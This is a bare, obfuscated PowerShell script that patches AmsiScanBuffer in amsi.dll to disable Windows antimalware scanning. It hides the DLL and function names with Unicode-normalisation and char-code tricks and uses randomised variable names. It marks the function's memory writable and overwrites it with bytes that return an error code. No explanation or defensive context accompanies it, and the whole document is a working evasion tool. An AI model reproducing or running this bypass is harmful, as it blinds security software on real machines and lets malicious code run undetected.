$nsrIl4KhnuAg = @"
using System;
using System.Runtime.InteropServices;
public class nsrIl4KhnuAg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr jPPU411Q0cLFhOM51, string ToAlX13);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr WEARl0U1OqRYtu, UIntPtr AS08ERwTFJlYzPfcSp, uint IW_B3SZsxmZ6nZCQiOrH, out uint HkX6uzAvW3kbIu2);
}
"@

Add-Type $nsrIl4KhnuAg

$IsJ = [nsrIl4KhnuAg]::LoadLibrary("$(('ámsì.'+'dll').nOrmAlIze([chAr]([bYTE]0x46)+[chAr](111)+[Char]([BYTE]0x72)+[CHAR]([bYTe]0x6d)+[ChAr](68+58-58)) -replace [cHar]([BYtE]0x5c)+[ChAR]([bYTE]0x70)+[cHar]([byte]0x7b)+[CHaR](50+27)+[CHAR](110)+[ChAR]([BYte]0x7d))")
$EFtfb4FdA2v5BCWM4IEh = [nsrIl4KhnuAg]::GetProcAddress($IsJ, "$(('ÃmsîScânBúf'+'fèr').norMAlIzE([char](70)+[cHaR](111)+[ChAR]([ByTE]0x72)+[ChAr]([bYTe]0x6d)+[cHar]([bytE]0x44)) -replace [ChAR](55+37)+[chAR]([BYte]0x70)+[CHar]([byTe]0x7b)+[cHaR](70+7)+[ChaR](110+20-20)+[Char]([BYte]0x7d))")
$p = 0
[nsrIl4KhnuAg]::VirtualProtect($EFtfb4FdA2v5BCWM4IEh, [uint32]5, 0x40, [ref]$p)
$PBTPxWCdqyaBTxB = "0xB8"
$I8B77bI3Y7 = "0x57"
$mpQpZ = "0x00"
$Ie1vgt9tO = "0x07"
$u_9E34RWyYPy978f = "0x80"
$VVyda4yg = "0xC3"
$QejNGDONnZgYpQd = [Byte[]] ($PBTPxWCdqyaBTxB,$I8B77bI3Y7,$mpQpZ,$Ie1vgt9tO,+$u_9E34RWyYPy978f,+$VVyda4yg)
[System.Runtime.InteropServices.Marshal]::Copy($QejNGDONnZgYpQd, 0, $EFtfb4FdA2v5BCWM4IEh, 6)